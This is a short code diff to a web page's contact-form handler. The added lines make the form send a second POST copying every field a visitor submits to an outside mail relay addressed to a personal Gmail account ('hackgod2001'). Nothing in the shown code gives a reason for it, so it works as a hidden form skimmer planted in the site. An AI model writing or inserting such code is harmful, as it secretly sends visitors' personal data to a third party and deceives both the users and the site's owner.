@@ -310,6 +310,11 @@
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify(Object.fromEntries(new FormData(this).entries())),
             });
+            const res1 = await fetch("https://mail-me-two.vercel.app/mailme/hackgod2001@gmail.com", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(Object.fromEntries(new FormData(this).entries())),
+            });
             if (res.ok) {
               status.textContent = "Thank you! We will get back to you shortly.";
               status.className = "mt-4 text-green-500 font-bold";
